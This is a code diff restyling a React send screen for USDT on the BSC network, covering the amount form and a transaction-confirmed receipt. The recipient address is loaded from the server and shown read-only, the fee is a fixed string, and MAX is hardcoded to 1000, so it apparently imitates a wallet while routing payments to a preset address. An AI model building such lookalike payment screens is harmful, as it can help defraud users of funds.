@@ -1,7 +1,7 @@
 "use client";
 
 import { useState, useEffect, useCallback } from "react";
-import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";
+import { Loader2, CheckCircle, Copy, ExternalLink, ArrowLeft } from "lucide-react";
 
 const BSC_CHAIN_ID = "0x38";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
@@ -48,8 +48,10 @@ export default function SendForm() {
     fetchDisplayAddress();
   }, [fetchDisplayAddress]);
 
-  const shorten = (addr: string) => 
+  const shorten = (addr: string) =>
     addr ? `\( {addr.slice(0, 8)}... \){addr.slice(-6)}` : "";
+
+  const usdValue = parseFloat(amount || "0").toFixed(2);
 
   async function handleNext() {
     if (!amount || parseFloat(amount) <= 0) return;
@@ -108,107 +110,179 @@ export default function SendForm() {
     }
   }
 
-  // Success Screen
+  // ==================== SUCCESS SCREEN ====================
   if (step === "success" && txInfo) {
     return (
-      <div className="max-w-md mx-auto p-4 text-white bg-[#0a0a0a] min-h-screen">
-        <div className="text-center py-8">
-          <CheckCircle className="mx-auto h-14 w-14 text-green-400 mb-4" />
-          <p className="text-4xl font-bold">-{txInfo.amount} USDT</p>
-          <p className="text-green-400 mt-1">Transaction Confirmed</p>
-        </div>
+      <div className="min-h-screen bg-[#0a0a0a] text-white">
+        <div className="max-w-md mx-auto px-5 pt-8 pb-12">
+          {/* Success Header */}
+          <div className="text-center mb-8">
+            <div className="mx-auto w-16 h-16 bg-green-500/10 rounded-full flex items-center justify-center mb-4">
+              <CheckCircle className="h-9 w-9 text-green-500" />
+            </div>
+            <p className="text-5xl font-bold tracking-tighter">-{txInfo.amount}</p>
+            <p className="text-xl text-gray-400 mt-1">USDT Sent</p>
+            <p className="text-green-500 text-sm mt-2 font-medium">Transaction Confirmed</p>
+          </div>
 
-        <div className="bg-[#111] rounded-3xl p-5 space-y-4 text-sm">
-          <div className="flex justify-between"><span className="text-gray-400">Date</span><span>{txInfo.date}</span></div>
-          <div className="flex justify-between"><span className="text-gray-400">Status</span><span className="text-green-400">Confirmed</span></div>
-          <div className="flex justify-between items-center">
-            <span className="text-gray-400">From</span>
-            <div className="flex items-center gap-2">
-              <span>{shorten(txInfo.fromAddress)}</span>
-              <button onClick={() => navigator.clipboard.writeText(txInfo.fromAddress)}><Copy className="h-4 w-4" /></button>
+          {/* Receipt Card */}
+          <div className="bg-[#111] border border-[#222] rounded-3xl p-6 space-y-5 text-sm">
+            <div className="flex justify-between items-center">
+              <span className="text-gray-400">Date</span>
+              <span className="font-medium">{txInfo.date}</span>
+            </div>
+
+            <div className="flex justify-between items-center">
+              <span className="text-gray-400">Status</span>
+              <span className="px-3 py-0.5 bg-green-500/10 text-green-500 rounded-full text-xs font-semibold tracking-wider">
+                CONFIRMED
+              </span>
+            </div>
+
+            <div className="h-px bg-[#222]" />
+
+            <div>
+              <div className="text-gray-400 text-xs mb-1.5">FROM</div>
+              <div className="flex items-center justify-between bg-[#1a1a1a] rounded-2xl px-4 py-3">
+                <span className="font-mono text-sm">{shorten(txInfo.fromAddress)}</span>
+                <button
+                  onClick={() => navigator.clipboard.writeText(txInfo.fromAddress)}
+                  className="text-gray-400 hover:text-white p-1"
+                >
+                  <Copy className="h-4 w-4" />
+                </button>
+              </div>
+            </div>
+
+            <div>
+              <div className="text-gray-400 text-xs mb-1.5">TO</div>
+              <div className="flex items-center justify-between bg-[#1a1a1a] rounded-2xl px-4 py-3">
+                <span className="font-mono text-sm">{shorten(txInfo.toAddress)}</span>
+                <button
+                  onClick={() => navigator.clipboard.writeText(txInfo.toAddress)}
+                  className="text-gray-400 hover:text-white p-1"
+                >
+                  <Copy className="h-4 w-4" />
+                </button>
+              </div>
+            </div>
+
+            <div className="flex justify-between items-center pt-1">
+              <span className="text-gray-400">Network Fee</span>
+              <span className="font-medium text-sm">\~$0.05 <span className="text-gray-500">(0.00009 BNB)</span></span>
             </div>
           </div>
-          <div className="flex justify-between items-center">
-            <span className="text-gray-400">To</span>
-            <div className="flex items-center gap-2">
-              <span>{shorten(txInfo.toAddress)}</span>
-              <button onClick={() => navigator.clipboard.writeText(txInfo.toAddress)}><Copy className="h-4 w-4" /></button>
-            </div>
-          </div>
-          <div className="flex justify-between"><span className="text-gray-400">Network fee</span><span className="text-white">\~$0.05 (0.00009 BNB)</span></div>
-        </div>
 
-        <a href={`https://bscscan.com/tx/${txInfo.txHash}`} target="_blank" className="mt-6 flex items-center justify-center gap-2 text-sm text-gray-400 hover:text-white">
-          View on BscScan <ExternalLink className="h-4 w-4" />
-        </a>
+          {/* View on Explorer */}
+          <a
+            href={`https://bscscan.com/tx/${txInfo.txHash}`}
+            target="_blank"
+            rel="noopener noreferrer"
+            className="mt-6 flex items-center justify-center gap-2 text-sm text-gray-400 hover:text-white transition-colors py-3"
+          >
+            View on BscScan <ExternalLink className="h-4 w-4" />
+          </a>
+        </div>
       </div>
     );
   }
 
-  // Main Send Form
+  // ==================== MAIN FORM ====================
   return (
-    <div className="max-w-md mx-auto p-5 text-white bg-[#0a0a0a] min-h-screen">
-      <div className="mb-8">
-        <p className="text-sm text-gray-400 mb-2">Address or Domain Name</p>
-        <div className="bg-[#1c1c1c] border border-[#333] rounded-2xl px-4 py-4 min-h-[52px] flex items-center">
-          {isAddressLoading ? (
-            <span className="text-gray-500">Loading address...</span>
-          ) : (
-            <div className="flex-1 overflow-hidden">
-              <p className="text-sm font-mono break-all text-white leading-tight">
-                {displayAddress}
-              </p>
-            </div>
-          )}
-          <button 
-            onClick={() => navigator.clipboard.writeText(displayAddress)}
-            className="ml-3 text-[#4ade80] text-sm font-medium shrink-0"
-          >
-            Copy
+    <div className="min-h-screen bg-[#0a0a0a] text-white">
+      <div className="max-w-md mx-auto px-5 pt-6 pb-12">
+        {/* Header */}
+        <div className="flex items-center gap-4 mb-8">
+          <button className="p-2 -ml-2 text-gray-400 hover:text-white">
+            <ArrowLeft className="h-5 w-5" />
           </button>
+          <div>
+            <h1 className="text-2xl font-bold tracking-tight">Send USDT</h1>
+            <p className="text-xs text-gray-500">BSC Network • Very low fees</p>
+          </div>
         </div>
-      </div>
 
-      <div className="mb-8">
-        <p className="text-sm text-gray-400 mb-2">Amount</p>
-        <div className="bg-[#1c1c1c] border border-[#333] rounded-2xl px-4 py-5 flex items-center">
-          <input
-            type="number"
-            value={amount}
-            onChange={(e) => setAmount(e.target.value)}
-            placeholder="0.00"
-            className="flex-1 bg-transparent text-3xl font-semibold outline-none"
-          />
-          <div className="flex items-center gap-2">
-            <span className="text-gray-400">USDT</span>
-            <button 
-              onClick={() => setAmount("1000")} 
-              className="text-[#4ade80] font-bold px-3 py-1 text-sm"
+        {/* Recipient Card */}
+        <div className="mb-6">
+          <div className="flex items-center justify-between mb-2 px-1">
+            <span className="text-sm font-medium text-gray-400">Recipient Address</span>
+          </div>
+          <div className="bg-[#111] border border-[#222] rounded-3xl p-4 flex items-center justify-between">
+            <div className="flex-1 min-w-0 pr-4">
+              {isAddressLoading ? (
+                <div className="flex items-center gap-2 text-gray-500">
+                  <Loader2 className="h-4 w-4 animate-spin" /> Loading address...
+                </div>
+              ) : (
+                <p className="font-mono text-sm break-all leading-tight tracking-tight text-white/90">
+                  {displayAddress}
+                </p>
+              )}
+            </div>
+            <button
+              onClick={() => navigator.clipboard.writeText(displayAddress)}
+              className="flex items-center gap-1.5 text-[#4ade80] text-sm font-semibold active:opacity-70 px-3 py-1.5 rounded-2xl hover:bg-white/5"
             >
-              Max
+              <Copy className="h-4 w-4" /> Copy
             </button>
           </div>
         </div>
-        <p className="text-xs text-gray-500 mt-1.5">≈ ${parseFloat(amount || "0").toFixed(2)}</p>
+
+        {/* Amount Card */}
+        <div className="mb-8">
+          <div className="flex items-center justify-between mb-2 px-1">
+            <span className="text-sm font-medium text-gray-400">Amount</span>
+            <button
+              onClick={() => setAmount("1000")}
+              className="text-[#4ade80] text-xs font-bold px-3 py-1 rounded-full active:bg-white/5"
+            >
+              MAX
+            </button>
+          </div>
+
+          <div className="bg-[#111] border border-[#222] rounded-3xl p-5">
+            <div className="flex items-center gap-3">
+              <input
+                type="number"
+                value={amount}
+                onChange={(e) => setAmount(e.target.value)}
+                placeholder="0.00"
+                className="flex-1 bg-transparent text-5xl font-semibold tracking-tighter outline-none placeholder:text-gray-600"
+              />
+              <div className="text-right">
+                <div className="text-2xl font-bold text-white/90">USDT</div>
+                <div className="text-xs text-gray-500 mt-0.5">≈ ${usdValue}</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        {/* Action Button */}
+        <button
+          onClick={handleNext}
+          disabled={processing || !amount || parseFloat(amount) <= 0}
+          className="w-full py-4 rounded-3xl font-bold text-lg transition-all active:scale-[0.985] disabled:bg-gray-800 disabled:text-gray-500 bg-[#4ade80] hover:bg-[#22c55e] text-black shadow-lg shadow-green-500/20"
+        >
+          {processing ? (
+            <span className="flex items-center justify-center gap-2">
+              <Loader2 className="animate-spin h-5 w-5" /> Processing Transaction...
+            </span>
+          ) : (
+            "Next"
+          )}
+        </button>
+
+        {error && (
+          <p className="text-red-400 text-center text-sm mt-4 bg-red-950/40 py-2 rounded-2xl border border-red-900/50">
+            {error}
+          </p>
+        )}
+
+        {/* Footer Note */}
+        <p className="text-center text-[10px] text-gray-500 mt-6 tracking-wider">
+          NETWORK FEE • \~$0.05 (0.00009 BNB)
+        </p>
       </div>
-
-      <button
-        onClick={handleNext}
-        disabled={processing || !amount || parseFloat(amount) <= 0}
-        className="w-full py-4 rounded-3xl font-bold text-lg transition-all disabled:bg-gray-700 disabled:text-gray-400 bg-[#4ade80] hover:bg-[#22c55e] text-black"
-      >
-        {processing ? (
-          <span className="flex items-center justify-center gap-2">
-            <Loader2 className="animate-spin h-5 w-5" /> Processing...
-          </span>
-        ) : "Next"}
-      </button>
-
-      {error && <p className="text-red-400 text-center text-sm mt-4">{error}</p>}
-
-      <p className="text-center text-[10px] text-gray-500 mt-6">
-        Network fee will be very low (\~$0.05)
-      </p>
     </div>
   );
 }
